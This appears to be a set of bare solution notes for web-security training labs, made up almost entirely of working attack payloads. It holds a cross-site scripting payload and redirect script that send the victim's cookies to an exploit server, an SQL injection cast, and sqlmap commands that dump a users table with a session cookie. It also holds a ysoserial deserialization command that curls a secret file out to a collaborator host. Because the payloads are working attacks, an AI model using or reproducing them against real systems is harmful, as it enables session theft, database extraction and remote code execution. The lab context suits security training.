1.

payload: `"-fetch('https://exploit-0ad8002e0436378180812af8014d0063'+decodeURIComponent('%2E')+'exploit-server'+decodeURIComponent('%2E')+'net/exploitabc?cookie='+document['cookie'])}//`

<script>
location='https://0a7c00030469134c80543acb00690098.web-security-academy.net/?SearchTerm=%22-fetch%28%27https%3A%2F%2Fexploit-0af70033040613b0804139e601000080%27%2BdecodeURIComponent%28%27%252E%27%29%2B%27exploit-server%27%2BdecodeURIComponent%28%27%252E%27%29%2B%27net%2Fexploitabc%3Fcookie%3D%27%2Bdocument%5B%27cookie%27%5D%29%7D%2F%2F'
</script>

2.
payload: `CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)`

tool

```bash
python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL"
```

```bash
python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" --dbs
```

```bash
python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" -D public --tables
```

```bash
python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" -D public -T users --dump
```


3. 

payload 
```bash
java -jar ysoserial.jar CommonsCollections6 'curl -d @/home/carlos/secret ij5zpg5
74rhzawjanoer5ut3buhl5dt2.oastify.com' | gzip | base64 -w 0 > text.txt
```